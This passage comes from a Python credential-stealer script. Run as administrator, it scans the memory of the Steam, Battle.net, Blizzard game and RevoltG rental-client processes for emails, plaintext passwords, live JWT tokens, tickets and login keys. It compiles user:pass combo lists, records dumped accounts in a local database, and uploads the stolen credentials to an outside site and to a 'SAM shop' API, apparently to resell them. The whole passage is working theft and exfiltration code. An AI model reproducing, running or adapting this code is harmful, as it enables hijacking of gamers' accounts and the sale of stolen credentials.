    r'(eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})'
)

# features_cached_data_points blob
FEATURES_RE = re.compile(
    r'features_cached_data_points\s*\{([^}]{20,2000})\}'
)


def _b64url_decode(s):
    """Decode base64url string with missing padding."""
    import base64
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - len(s) % 4
    if pad != 4:
        s += '=' * pad
    try:
        return base64.b64decode(s).decode('utf-8', errors='ignore')
    except Exception:
        return ''


def extract_bnet_jwt(all_strings):
    """
    Extract live Blizzard JWT access tokens from memory.
    Battle.net stores JWTs (RS256) after successful auth — no email/password.
    Also grabs features_cached_data_points for account metadata.
    """
    tokens  = []   # list of {token, account_id, exp, region, licenses, jti}
    seen_jti = set()

    for s in all_strings:
        # ---- JWT tokens ----
        for m in JWT_RE.finditer(s):
            jwt = m.group(1)
            # Decode payload (middle section)
            parts = jwt.split('.')
            if len(parts) < 2:
                continue
            payload_raw = _b64url_decode(parts[1])
            if not payload_raw:
                continue
            try:
                payload = json.loads(payload_raw)
            except Exception:
                # Try to extract fields via regex if JSON parse fails
                payload = {}

            jti = payload.get('jti', '') or re.search(r'"jti"\s*:\s*"([^"]+)"', payload_raw)
            if hasattr(jti, 'group'):
                jti = jti.group(1)
            if not jti:
                jti = jwt[-16:]   # fallback dedup key

            if jti in seen_jti:
                continue
            seen_jti.add(jti)

            exp     = payload.get('exp', 0)
            sub     = payload.get('sub', '') or payload.get('account_id', '')
            region  = payload.get('region', '')
            roles   = payload.get('roles', payload.get('role', []))
            programs= payload.get('programs', [])

            # Skip already-expired tokens
            from datetime import datetime, timezone
            if exp and int(exp) < datetime.now(timezone.utc).timestamp():
                continue

            tokens.append({
                'jwt':        jwt,
                'account_id': str(sub),
                'exp':        str(exp),
                'region':     region,
                'roles':      roles if isinstance(roles, list) else [roles],
                'programs':   programs,
                'jti':        jti,
                'licenses':   [],
            })

        # ---- features_cached_data_points ----
        for fm in FEATURES_RE.finditer(s):
            blob = '{' + fm.group(1) + '}'
            try:
                data = json.loads(blob)
            except Exception:
                continue
            aid       = str(data.get('account_id', ''))
            licenses  = data.get('licenses', [])
            reg       = data.get('account_region', '')
            country   = data.get('account_country', '')
            if not aid:
                continue
            # Attach to matching JWT token
            matched = False
            for t in tokens:
                if t['account_id'] == aid or not t['account_id']:
                    t['account_id']  = aid
                    t['licenses']    = licenses
                    if not t['region'] and reg:
                        t['region']  = reg
                    t['country']     = country
                    matched = True
                    break
            if not matched:
                # Store as metadata-only entry (no JWT yet)
                tokens.append({
                    'jwt':        '',
                    'account_id': aid,
                    'exp':        '',
                    'region':     reg,
                    'country':    country,
                    'licenses':   licenses,
                    'roles':      [],
                    'programs':   [],
                    'jti':        'meta_' + aid,
                })

    # Deduplicate metadata-only entries that later got a JWT
    final = []
    seen_aid = set()
    # JWTs first
    for t in tokens:
        if t['jwt'] and t['account_id'] not in seen_aid:
            seen_aid.add(t['account_id'])
            final.append(t)
    # Metadata-only
    for t in tokens:
        if not t['jwt'] and t['account_id'] not in seen_aid:
            seen_aid.add(t['account_id'])
            final.append(t)
    return final


def extract_bnet_credentials(all_strings):
    """
    Extract Battle.net credential payloads from scanned memory strings.
    RevoltG stores bnet account info as JSON similar to Steam:
      {"email": "...", "password": "...", "battleTag": "...", ...}
    """
    creds = []
    seen = set()

    for s in all_strings:
        # Must contain email and at least one other bnet field
        has_email    = '"email"' in s or 'email:' in s.lower()
        has_password = '"password"' in s
        has_tag      = ('battleTag' in s or 'battletag' in s.lower() or
                        'BattleTag' in s or '#' in s)  # battleTag format: Name#1234
        has_token    = any(k in s for k in (
            'webCredentials', 'bnetToken', '"ticket"', 'accessToken',
            'authToken', 'sessionToken', 'token:', 'Token:'
        ))
        has_blizz    = any(k in s for k in (
            'battle.net', 'blizzard', 'Blizzard', 'Battle.net',
            'productId', 'gameProduct', 'account_id',
        ))

        if not has_email:
            continue
        # Relaxed: need email + at least one other indicator
        if not (has_password or has_tag or has_token or has_blizz):
            continue

        # Multiple email regex patterns — JSON, plain colon, URI-encoded
        email_patterns = [
            r'"email"\s*:\s*"([^"@\s]{1,80}@[^"\s]{1,80})"',    # JSON
            r'email["\s]*:["\s]*([^"@\s,}{]{1,80}@[^"\s,}{]{1,80})',  # loose
            r'([a-zA-Z0-9_.+\-]{1,60}@[a-zA-Z0-9.\-]{1,60}\.[a-zA-Z]{2,8})',  # bare email
        ]
        found_email = None
        for ep in email_patterns:
            em = re.search(ep, s)
            if em:
                found_email = em
                break
        if not found_email:
            continue

        for e_match in re.finditer(r'([a-zA-Z0-9_.+\-]{1,60}@[a-zA-Z0-9.\-]{1,60}\.[a-zA-Z]{2,8})', s):
            email = e_match.group(1)
            if email in seen or len(email) < 6:
                continue

            # Wide context window — 800 before, 2000 after to catch long tokens
            start = max(0, e_match.start() - 800)
            end   = min(len(s), e_match.end() + 2000)
            ctx   = s[start:end]

            password       = ''
            battle_tag     = ''
            account_id     = ''
            region         = ''
            product_id     = ''
            product_name   = ''
            web_credentials= ''
            ticket         = ''
            bnet_token     = ''
            client_id      = ''
            revolt_id      = ''
            expires        = ''

            # Password
            pm = re.search(r'"password"\s*:\s*"([^"]+)"', ctx)
            if pm:
                password = pm.group(1)

            # battleTag — loose match too (Name#1234)
            bt = re.search(r'"(?:battleTag|battletag|BattleTag)"\s*:\s*"([^"]+)"', ctx, re.IGNORECASE)
            if not bt:
                bt = re.search(r'([A-Za-z][A-Za-z0-9]{2,20}#\d{4,6})', ctx)  # bare format
            if bt:
                battle_tag = bt.group(1)

            # accountId
            ai = re.search(r'"(?:accountId|account_id|id)"\s*:\s*"?([A-Za-z0-9_\-]{4,})"?', ctx)
            if ai:
                account_id = ai.group(1)

            # region — case-insensitive, also bare form
            rg = re.search(r'"region"\s*:\s*"([A-Za-z]{2,4})"', ctx)
            if not rg:
                rg = re.search(r'region["\s]*:["\s]*([A-Z]{2,4})', ctx)
            if rg:
                region = rg.group(1).upper()

            # productId / gameProduct
            pr = re.search(r'"(?:productId|gameProduct|product|gameId|productCode)"\s*:\s*"([^"]+)"', ctx)
            if pr:
                product_id = pr.group(1)
                product_name = BNET_PRODUCT_CACHE.get(product_id, product_id)

            # product name override from payload
            pn = re.search(r'"(?:productName|gameName|appName|title|name)"\s*:\s*"([^"]+)"', ctx)
            if pn and not pn.group(1).startswith('App '):
                product_name = pn.group(1)

            # webCredentials (long opaque token, can be 100-2000 chars)
            wc = re.search(r'webCredentials["\s]*:["\s]*([A-Za-z0-9+/=._\-]{20,})', ctx)
            if wc:
                web_credentials = wc.group(1).strip('"')

            # ticket (short or long)
            tk = re.search(r'"ticket"\s*:\s*"([^"]{4,})"', ctx)
            if not tk:
                tk = re.search(r'ticket["\s]*:["\s]*([A-Za-z0-9+/=._\-]{8,})', ctx)
            if tk:
                ticket = tk.group(1).strip('"')

            # bnetToken / accessToken / sessionToken / authToken
            bn = re.search(
                r'"(?:bnetToken|accessToken|sessionToken|authToken|token)"\s*:\s*"([^"]+)"', ctx
            )
            if not bn:
                bn = re.search(r'(?:bnetToken|accessToken|authToken)["\s]*:["\s]*([A-Za-z0-9+/=._\-]{20,})', ctx)
            if bn:
                bnet_token = bn.group(1).strip('"')

            # expires
            ex = re.search(r'"expires(?:At|In|_at)?"\s*:\s*"?(\d+)"?', ctx)
            if ex:
                expires = ex.group(1)

            # clientId
            ci = re.search(r'"clientId"\s*:\s*"([^"]+)"', ctx)
            if ci:
                client_id = ci.group(1)

            # RevoltG specific rental client ID
            ri = re.search(r'"(?:revoltId|rentalId|rentId|revolt_id)"\s*:\s*"([^"]+)"', ctx)
            if ri:
                revolt_id = ri.group(1)

            # Accept email + battleTag alone (no password needed if tag present)
            if not password and not web_credentials and not ticket and not bnet_token:
                if not battle_tag:  # if no tag either, skip
                    continue

            seen.add(email)
            creds.append({
                'email':           email,
                'password':        password,
                'battle_tag':      battle_tag,
                'account_id':      account_id,
                'region':          region,
                'product_id':      product_id,
                'product_name':    product_name,
                'web_credentials': web_credentials,
                'ticket':          ticket,
                'bnet_token':      bnet_token,
                'client_id':       client_id,
                'revolt_client_id':revolt_id,
                'expires':         expires,
            })

    return creds


def extract_cmdline_credentials(all_strings, known_usernames=None):
    """Extract credentials from Steam launch command lines."""
    creds = {}
    known = set(u.lower() for u in (known_usernames or []))
    
    for s in all_strings:
        if '-login' not in s.lower():
            continue
        
        # Pattern 1: -login user "password"
        m = re.search(r'-login\s+([a-zA-Z0-9_]+)\s+"([^"]+)"', s)
        if m:
            username, password = m.group(1), m.group(2)
            if len(username) > 3 and len(password) > 3 and not password.startswith('-'):
                creds[username] = password
                continue
        
        # Pattern 2: -login user password (no quotes, validate user is known)
        m = re.search(r'-login\s+([a-zA-Z0-9_]+)\s+(\S+)', s)
        if m:
            username, password = m.group(1), m.group(2)
            if (len(username) > 3 and len(password) > 3 and 
                not password.startswith('-') and
                (not known or username.lower() in known)):
                creds[username] = password
    
    return creds


def parse_loginusers_vdf(steam_path):
    """Parse loginusers.vdf for account metadata."""
    vdf_path = os.path.join(steam_path, 'config', 'loginusers.vdf')
    accounts = {}
    
    if not os.path.exists(vdf_path):
        return accounts
    
    try:
        with open(vdf_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Simple VDF parser for loginusers
        current_id = None
        for line in content.split('\n'):
            line = line.strip().strip('"')
            
            # SteamID64 line (17-digit number)
            if re.match(r'^\d{17}$', line):
                current_id = line
                accounts[current_id] = {}
            elif current_id and '\t' in line.strip('"'):
                parts = line.split('"')
                parts = [p for p in parts if p.strip() and p.strip() != '\t\t']
                if len(parts) >= 2:
                    key = parts[0].strip()
                    val = parts[1].strip() if len(parts) > 1 else ''
                    accounts.setdefault(current_id, {})[key] = val
    except:
        pass
    
    return accounts

# ============================================
# Main
# ============================================

def main():
    banner()
    
    # Check admin
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    
    if not is_admin:
        print(f"{C.RED}[!] Run this script as Administrator!{C.RESET}")
        sys.exit(1)
    
    # Check processes
    steam_pids  = get_pids('steam.exe')
    revolt_pids = get_pids('RevoltG.exe')

    # Battle.net process list
    BNET_PROCS = [
        'Battle.net.exe', 'Agent.exe', 'BlizzardError.exe',
        'Wow.exe', 'WowClassic.exe', 'Hearthstone.exe',
        'Heroes of the Storm.exe', 'Overwatch.exe', 'StarCraft.exe',
        'StarCraft II.exe', 'Diablo IV.exe', 'Diablo III.exe',
        'ModernWarfare.exe', 'BlackOpsColdWar.exe', 'Vanguard.exe',
    ]
    bnet_pids   = []
    for bproc in BNET_PROCS:
        for pid in get_pids(bproc):
            bnet_pids.append((pid, bproc))

    if not steam_pids and not revolt_pids and not bnet_pids:
        print(f"{C.RED}[!] Neither Steam, Battle.net, nor RevoltG is running.")
        print(f"    Start RevoltG, login to a Steam/Battle.net account, then run this script.{C.RESET}")
        sys.exit(1)

    print(f"{C.GREEN}[+] Steam processes:      {len(steam_pids)} found{C.RESET}")
    print(f"{C.GREEN}[+] Battle.net processes: {len(bnet_pids)} found{C.RESET}")
    print(f"{C.GREEN}[+] RevoltG processes:    {len(revolt_pids)} found{C.RESET}")

    # Get Steam path & account metadata
    steam_path = get_steam_path()
    vdf_accounts = {}
    if steam_path:
        print(f"{C.DIM}[*] Steam path: {steam_path}{C.RESET}")
        vdf_accounts = parse_loginusers_vdf(steam_path)

    # Build search patterns from known accounts in loginusers.vdf
    known_usernames = set()
    for sid, info in vdf_accounts.items():
        name = info.get('AccountName', '')
        if name:
            known_usernames.add(name)

    # Core patterns to search (Steam + Battle.net)
    patterns = [
        ('json_payload',  b'"account"'),
        ('login_cmd',     b'-login'),
        ('login_cmd_u16', b'-\x00l\x00o\x00g\x00i\x00n\x00'),
        ('bnet_email',    b'"email"'),
        ('bnet_tag',      b'battleTag'),
        ('bnet_cred',     b'webCredentials'),
        ('bnet_ticket',   b'"ticket"'),
    ]

    # Add known usernames as patterns
    for uname in known_usernames:
        patterns.append((f'user_{uname}', uname.encode('ascii')))

    # Scan all processes
    print(f"\n{C.CYAN}[*] Scanning process memory...{C.RESET}")

    all_strings = []

    targets = []
    for pid in steam_pids:
        targets.append((pid, 'steam.exe'))
    for name in ['steamwebhelper.exe', 'steamservice.exe']:
        for pid in get_pids(name):
            targets.append((pid, name))
    for pid, pname in bnet_pids:
        targets.append((pid, pname))
    for pid in revolt_pids:
        targets.append((pid, 'RevoltG.exe'))
    
    for pid, pname in targets:
        print(f"{C.DIM}    Scanning {pname} (PID={pid})...{C.RESET}", end=' ', flush=True)
        results = scan_process(pid, patterns)
        count = len(results)
        print(f"{C.DIM}{count} hits{C.RESET}")
        
        for pat_name, strings in results:
            all_strings.extend(strings)
    
    # Extract credentials
    print(f"\n{C.CYAN}[*] Extracting credentials...{C.RESET}")

    json_creds    = extract_json_credentials(all_strings)
    cmdline_creds = extract_cmdline_credentials(all_strings, known_usernames)
    bnet_creds    = extract_bnet_credentials(all_strings)
    jwt_results   = extract_bnet_jwt(all_strings)
    
    # Merge everything
    accounts = {}
    
    for cred in json_creds:
        acc = cred.get('account', '')
        if acc:
            # If account already exists, only update fields that are not empty
            if acc not in accounts:
                accounts[acc] = {}
                
            accounts[acc]['username'] = acc
            if cred.get('password'): accounts[acc]['encrypted_password'] = cred.get('password')
            
            game_id_val = cred.get('gameId') or cred.get('steamId') or cred.get('appId') or ''
            if game_id_val: accounts[acc]['game_id'] = game_id_val
            
            game_name_val = cred.get('gameName') or ''
            if game_name_val and not game_name_val.startswith('App '): 
                accounts[acc]['game_name'] = game_name_val
                
            if cred.get('clientId'): accounts[acc]['revolt_client_id'] = cred.get('clientId')
            if cred.get('expires'): accounts[acc]['expires'] = cred.get('expires')
            if cred.get('token'): accounts[acc]['token'] = cred.get('token')
            if cred.get('machineId'): accounts[acc]['machine_id'] = cred.get('machineId')
            if cred.get('loginKey'): accounts[acc]['login_key'] = cred.get('loginKey')
    
    # From command line (plaintext password!)
    for username, password in cmdline_creds.items():
        accounts.setdefault(username, {}).update({
            'username': username,
            'password': password,
        })
    
    # From loginusers.vdf (metadata)
    for sid, info in vdf_accounts.items():
        acc_name = info.get('AccountName', '')
        if acc_name and acc_name in accounts:
            accounts[acc_name].update({
                'steam_id64': sid,
                'persona_name': info.get('PersonaName', ''),
            })
            
    # ============================================
    # Database initialization
    # ============================================

    db_conn = init_db()
    new_accounts = {}

    # Filter out accounts that don't have a plaintext password or are already dumped
    for k, v in accounts.items():
        if v.get('password'):
            if not is_account_dumped(db_conn, k):
                new_accounts[k] = v

    accounts = new_accounts

    # ---- Battle.net email-cred dedup & filter ----
    bnet_accounts = {}
    for bc in bnet_creds:
        em = bc.get('email', '')
        if not em:
            continue
        if not bc.get('password') and not bc.get('web_credentials') and not bc.get('ticket') and not bc.get('bnet_token'):
            continue
        if not is_bnet_account_dumped(db_conn, em):
            bnet_accounts[em] = bc

    # ---- Battle.net JWT dedup & filter (primary path) ----
    # Key by account_id since we have no email
    for jt in jwt_results:
        aid = jt.get('account_id', '')
        if not aid:
            continue
        # Use 'jwt_<account_id>' as the email-column key so DB dedup works
        db_key = f'jwt_{aid}'
        if not is_bnet_account_dumped(db_conn, db_key):
            # Merge with email entry if same account_id
            if aid in bnet_accounts:
                bnet_accounts[aid].update({
                    'bnet_token': jt.get('jwt', ''),
                    'expires':    jt.get('exp', ''),
                    'region':     jt.get('region', '') or bnet_accounts[aid].get('region', ''),
                    'licenses':   jt.get('licenses', []),
                })
            else:
                bnet_accounts[db_key] = {
                    'email':           db_key,
                    'account_id':      aid,
                    'battle_tag':      '',
                    'region':          jt.get('region', ''),
                    'country':         jt.get('country', ''),
                    'product_id':      '',
                    'product_name':    '',
                    'web_credentials': '',
                    'ticket':          '',
                    'bnet_token':      jt.get('jwt', ''),
                    'expires':         jt.get('exp', ''),
                    'licenses':        jt.get('licenses', []),
                    'roles':           jt.get('roles', []),
                    'programs':        jt.get('programs', []),
                    'client_id':       '',
                    'revolt_client_id':'',
                    'password':        '',
                }
            
    # ============================================
    # Output
    # ============================================
    
    no_new_accounts = not accounts and not bnet_accounts
    if no_new_accounts:
        # Khong thoat o day: buoc dong bo web ben duoi van phai chay de ten
        # game nhap trong game_map.txt duoc day lai len vietrealm.asia. Thoat
        # som se khiien "dien ten roi chay lai" khong bao gio co tac dung.
        print(f"\n{C.YELLOW}[!] Khong co tai khoan MOI trong RAM.")
        print(f"{C.DIM}    Hay mo RevoltG va dang nhap Steam/Battle.net truoc khi chay lai.{C.RESET}")
        print(f"{C.DIM}    Van tiep tuc dong bo ten game len web.{C.RESET}")

    output_file      = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'revoltg_accounts.txt')
    bnet_output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'revoltg_bnet_accounts.txt')

    print(f"\n{C.GREEN}{C.BOLD}{'='*60}")
    print(f"  NEW STEAM ACCOUNTS:      {len(accounts)}")
    print(f"  NEW BATTLE.NET ACCOUNTS: {len(bnet_accounts)}")
    print(f"  (JWT tokens:             {sum(1 for b in bnet_accounts.values() if b.get('bnet_token'))})")
    print(f"{'='*60}{C.RESET}\n")
    
    lines = []

    # Append mode for the text file so we don't overwrite previous dumps
    if not no_new_accounts:
        if not os.path.exists(output_file):
            lines.append(f"RevoltG Account Dump - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            lines.append(f"{'='*60}\n")
        else:
            lines.append(f"\n\nRevoltG Account Dump - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            lines.append(f"{'='*60}\n")

    running_appid = get_running_steam_appid()
    if running_appid and running_appid != '0':
        running_name = get_running_game_names(steam_path)
        shown = running_name.get(str(APP_ID_MAP.get(running_appid, running_appid)))
        print(f"{C.GREEN}[+] Steam dang chay: AppID {running_appid}"
              f"{' - ' + shown if shown else ''}{C.RESET}")
    else:
        print(f"{C.DIM}[*] Khong co game Steam nao dang chay (RunningAppID = 0).{C.RESET}")

    unnamed_appids = set()
    for i, (username, info) in enumerate(accounts.items(), 1):
        password = info.get('password', '')
        enc_pw = info.get('encrypted_password', '')
        steam_id = info.get('steam_id64') or 'N/A'
        persona = info.get('persona_name') or 'N/A'
        
        # Lấy chuẩn ID game
        mem_game_id = info.get('game_id') or ''
        
        # Luôn ưu tiên dùng running_appid nếu nó hợp lệ
        if running_appid and running_appid != '0':
            game_id = running_appid
        else:
            game_id = mem_game_id
            
        # Map spoofed ID to real ID
        if game_id in APP_ID_MAP:
            game_id = APP_ID_MAP[game_id]
            
        if not game_id:
            game_id = 'N/A'
            
        # Tên game: ưu tiên game_map.txt, rồi tên RevoltG tự khai, rồi Steam
        # local/store. AppID giả của RevoltG không nguồn nào tra được -> ghi
        # "App <id>" và đẩy vào game_map.txt để user điền tên một lần.
        game_name_ext = info.get('game_name')
        if not game_name_ext or game_name_ext.startswith('App '):
            # Một RAM hit khác có thể đã biết tên của AppID này
            if game_id in REVOLT_NAME_CACHE:
                game_name_ext = REVOLT_NAME_CACHE[game_id]

        game_name, name_source = resolve_game_name(
            game_id, steam_path, game_name_ext)

        if not game_name:
            game_name = f"App {game_id}"
            name_source = 'unknown'
            unnamed_appids.add(game_id)
        info['game_source'] = name_source

        # Override metadata with the more accurate info
        info['game_id'] = game_id
        info['game_name'] = game_name
        client_id = info.get('revolt_client_id') or 'N/A'
        expires = info.get('expires') or ''
        token = info.get('token') or ''
        machine_id = info.get('machine_id') or ''
        login_key = info.get('login_key') or ''
        
        # Save to database to prevent future duplicates
        info['steam_id64'] = steam_id if steam_id != 'N/A' else None
        info['game_name'] = game_name
        info['password'] = password
        info['encrypted_password'] = enc_pw
        info['persona_name'] = persona if persona != 'N/A' else None
        save_account_to_db(db_conn, info)
        
        # Format expiry
        exp_str = 'N/A'
        if expires:
            try:
                exp_str = datetime.fromtimestamp(int(expires), tz=timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
            except:
                exp_str = str(expires)
        
        # Console output
        print(f"  {C.BOLD}Account #{i}{C.RESET}")
        print(f"  {C.WHITE}Username:      {C.GREEN}{username}{C.RESET}")
        if password:
            print(f"  {C.WHITE}Password:      {C.GREEN}{C.BOLD}{password}{C.RESET}")
        if enc_pw:
            print(f"  {C.WHITE}Encrypted PW:  {C.DIM}{enc_pw}{C.RESET}")
        print(f"  {C.WHITE}SteamID64:     {C.CYAN}{steam_id}{C.RESET}")
        print(f"  {C.WHITE}Persona:       {C.CYAN}{persona}{C.RESET}")
        src_label = {
            'map':     'game_map.txt',
            'cache':   'bang ten san co',
            'revolt':  'RevoltG',
            'local':   'Steam may cai',
            'api':     'Steam store',
        }.get(name_source, 'CHUA BIET TEN')
        game_color = C.DIM if name_source == 'unknown' else C.CYAN
        print(f"  {C.WHITE}Game:          {game_color}{game_name}{C.RESET} "
              f"{C.DIM}(App {game_id} - {src_label}){C.RESET}")
        print(f"  {C.WHITE}RevoltG ID:    {C.DIM}{client_id}{C.RESET}")
        if token:
            print(f"  {C.WHITE}Token:         {C.DIM}{token}{C.RESET}")
        if machine_id:
            print(f"  {C.WHITE}Machine ID:    {C.DIM}{machine_id}{C.RESET}")
        if login_key:
            print(f"  {C.WHITE}Login Key:     {C.DIM}{login_key}{C.RESET}")
        print(f"  {C.WHITE}Expires:       {C.YELLOW}{exp_str}{C.RESET}")
        if steam_id != 'N/A':
            print(f"  {C.WHITE}Profile:       {C.DIM}https://steamcommunity.com/profiles/{steam_id}{C.RESET}")
        print()
        
        # File output
        lines.append(f"Account #{i}")
        lines.append(f"  Username:       {username}")
        if password:
            lines.append(f"  Password:       {password}")
        if enc_pw:
            lines.append(f"  Encrypted PW:   {enc_pw}")
        lines.append(f"  SteamID64:      {steam_id}")
        lines.append(f"  Persona:        {persona}")
        lines.append(f"  Game:           {game_name} (App {game_id} - {src_label})")
        lines.append(f"  RevoltG ID:     {client_id}")
        if token:
            lines.append(f"  Token:          {token}")
        if machine_id:
            lines.append(f"  Machine ID:     {machine_id}")
        if login_key:
            lines.append(f"  Login Key:      {login_key}")
        lines.append(f"  Expires:        {exp_str}")
        if steam_id != 'N/A':
            lines.append(f"  Profile:        https://steamcommunity.com/profiles/{steam_id}")
        lines.append(f"  Combo:          {username}:{password}" if password else f"  Combo:          {username}:<encrypted>")
        lines.append('')
    
    # Combo list
    if accounts:
        lines.append(f"\n{'='*60}")
        lines.append("COMBO LIST (user:pass)")
        lines.append(f"{'='*60}")
        for username, info in accounts.items():
            pw = info.get('password', info.get('encrypted_password', ''))
            lines.append(f"{username}:{pw}")
    
    # Write file (append mode so we don't overwrite)
    if lines:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write('\n'.join(lines) + '\n')
        print(f"{C.GREEN}[+] Appended to: {output_file}{C.RESET}")
    else:
        print(f"{C.DIM}    Khong co tai khoan moi de ghi vao {os.path.basename(output_file)}{C.RESET}")

    # AppID RevoltG cap ma Steam khong biet -> ghi ra game_map.txt de user
    # dien ten mot lan, cac lan sau tool se tu tra ra ten.
    if unnamed_appids:
        added = remember_unresolved_appids(unnamed_appids)
        if added:
            print(f"\n{C.YELLOW}[!] {len(added)} AppID chua co ten tren Steam "
                  f"(RevoltG cap AppID rieng):{C.RESET}")
            for app_id in added:
                print(f"{C.DIM}    {app_id}{C.RESET}")
            print(f"{C.DIM}    Mo {GAME_MAP_FILE}, them ten ben phai '=' roi chay lai.{C.RESET}")

    # ============================================
    # Battle.net Output
    # ============================================

    if bnet_accounts:
        bnet_lines = []
        if not os.path.exists(bnet_output_file):
            bnet_lines.append(f"RevoltG Battle.net Account Dump - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            bnet_lines.append(f"{'='*60}\n")
        else:
            bnet_lines.append(f"\n\nRevoltG Battle.net Account Dump - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            bnet_lines.append(f"{'='*60}\n")

        print(f"\n{C.CYAN}{C.BOLD}--- Battle.net Accounts ---{C.RESET}")

        for i, (email, bc) in enumerate(bnet_accounts.items(), 1):
            pw             = bc.get('password', '')
            battle_tag     = bc.get('battle_tag', 'N/A') or 'N/A'
            account_id     = bc.get('account_id', 'N/A') or 'N/A'
            region         = bc.get('region', 'N/A') or 'N/A'
            product_id     = bc.get('product_id', 'N/A') or 'N/A'
            product_name   = bc.get('product_name', '') or product_id
            web_creds      = bc.get('web_credentials', '') or ''
            ticket         = bc.get('ticket', '') or ''
            bnet_token     = bc.get('bnet_token', '') or ''
            client_id      = bc.get('client_id', 'N/A') or 'N/A'
            revolt_id      = bc.get('revolt_client_id', 'N/A') or 'N/A'
            expires        = bc.get('expires', '') or ''

            exp_str = 'N/A'
            if expires:
                try:
                    exp_str = datetime.fromtimestamp(int(expires), tz=timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
                except:
                    exp_str = str(expires)

            # Console
            print(f"  {C.BOLD}BNet Account #{i}{C.RESET}")
            print(f"  {C.WHITE}Email:         {C.GREEN}{email}{C.RESET}")
            if pw:
                print(f"  {C.WHITE}Password:      {C.GREEN}{C.BOLD}{pw}{C.RESET}")
            print(f"  {C.WHITE}BattleTag:     {C.CYAN}{battle_tag}{C.RESET}")
            print(f"  {C.WHITE}Account ID:    {C.DIM}{account_id}{C.RESET}")
            print(f"  {C.WHITE}Region:        {C.DIM}{region}{C.RESET}")
            print(f"  {C.WHITE}Game:          {C.DIM}{product_name} ({product_id}){C.RESET}")
            if web_creds:
                print(f"  {C.WHITE}WebCreds:      {C.DIM}{web_creds[:60]}...{C.RESET}")
            if ticket:
                print(f"  {C.WHITE}Ticket:        {C.DIM}{ticket[:60]}...{C.RESET}")
            if bnet_token:
                print(f"  {C.WHITE}BNet Token:    {C.DIM}{bnet_token[:60]}...{C.RESET}")
            print(f"  {C.WHITE}Client ID:     {C.DIM}{client_id}{C.RESET}")
            print(f"  {C.WHITE}RevoltG ID:    {C.DIM}{revolt_id}{C.RESET}")
            print(f"  {C.WHITE}Expires:       {C.YELLOW}{exp_str}{C.RESET}")
            print()

            # File output
            bnet_lines.append(f"BNet Account #{i}")
            bnet_lines.append(f"  Email:         {email}")
            if pw:
                bnet_lines.append(f"  Password:      {pw}")
            bnet_lines.append(f"  BattleTag:     {battle_tag}")
            bnet_lines.append(f"  Account ID:    {account_id}")
            bnet_lines.append(f"  Region:        {region}")
            bnet_lines.append(f"  Game:          {product_name} ({product_id})")
            if web_creds:
                bnet_lines.append(f"  WebCreds:      {web_creds}")
            if ticket:
                bnet_lines.append(f"  Ticket:        {ticket}")
            if bnet_token:
                bnet_lines.append(f"  BNet Token:    {bnet_token}")
            bnet_lines.append(f"  Client ID:     {client_id}")
            bnet_lines.append(f"  RevoltG ID:    {revolt_id}")
            bnet_lines.append(f"  Expires:       {exp_str}")
            bnet_lines.append(f"  Combo:         {email}:{pw}" if pw else f"  Combo:         {email}:<token_only>")
            bnet_lines.append('')

            # Save to DB
            save_bnet_account_to_db(db_conn, bc)

        # Combo section
        bnet_lines.append(f"\n{'='*60}")
        bnet_lines.append("BNET COMBO LIST (email:pass)")
        bnet_lines.append(f"{'='*60}")
        for email, bc in bnet_accounts.items():
            pw = bc.get('password', '')
            bnet_lines.append(f"{email}:{pw}" if pw else f"{email}:<token_only>")

        with open(bnet_output_file, 'a', encoding='utf-8') as f:
            f.write('\n'.join(bnet_lines) + '\n')

        print(f"{C.GREEN}[+] Battle.net accounts saved to: {bnet_output_file}{C.RESET}")

    # Upload to VietRealm web (vietrealm.asia -> admin "Tài khoản Revolt")
    print(f"\n{C.CYAN}[*] Uploading accounts to VietRealm ({VIETREALM_URL})...{C.RESET}")

    # Keo danh sach hien co truoc de bao cao. POST /api/revolt tu upsert theo
    # username nen khong can bo qua gi o phia duong.
    existing_on_web = vietrealm_existing_usernames()
    if existing_on_web:
        print(f"{C.DIM}    Web hien co {len(existing_on_web)} tai khoan.{C.RESET}")
    uploaded = 0

    # Accounts dumped before this link existed are already in the local DB, so the
    # scan above skipped them. Re-send them too: the endpoint upserts on
    # username, so this refreshes the game note instead of duplicating a row.
    uploaded += upload_db_accounts_to_web(db_conn, steam_path)

    steam_upload = {}
    for username, info in (accounts or {}).items():
        pw = info.get('password') or info.get('encrypted_password') or ''
        if not username or not pw:
            continue
        steam_upload[username] = info

    if steam_upload:
        for username, info in steam_upload.items():
            pw = info.get('password') or info.get('encrypted_password') or ''
            game = info.get('game_name') or ''
            gid = info.get('game_id') or ''
            sid = info.get('steam_id64') or ''
            bits = ['Steam']
            if game and not game.startswith('App '):
                bits.append(f'game:{game}')
            elif gid and gid != 'N/A':
                bits.append(f'appid:{gid}')
            if sid and str(sid) not in ('N/A', '0', 'None', ''):
                bits.append(f'id:{sid}')
            if vietrealm_upload_account(username, pw, note=' | '.join(bits)):
                uploaded += 1
    else:
        print(f"{C.DIM}    No Steam accounts to send to the web (no password){C.RESET}")

    if bnet_accounts:
        for email, bc in bnet_accounts.items():
            pw = bc.get('password') or ''
            if not pw:
                continue
            btag = bc.get('battle_tag') or ''
            bits = ['Battle.net']
            if btag and btag != 'N/A':
                bits.append(f'btag:{btag}')
            acc_id = bc.get('account_id') or ''
            if acc_id and str(acc_id) not in ('N/A', '0', 'None', ''):
                bits.append(f'id:{acc_id}')
            if vietrealm_upload_account(email, pw, email=email, note=' | '.join(bits)):
                uploaded += 1

    print(f"{C.GREEN}[+] VietRealm done: {uploaded} account(s) sent{C.RESET}")

    # Upload Steam combos to SAM shop API (Telegram removed)
    if accounts:
        print(f"\n{C.CYAN}[*] Uploading Steam accounts to SAM shop...{C.RESET}")
        print(f"{C.DIM}    {SAM_SHOP_URL}/api/shop/upload/json{C.RESET}")
        sam_shop_upload_steam(accounts)
    else:
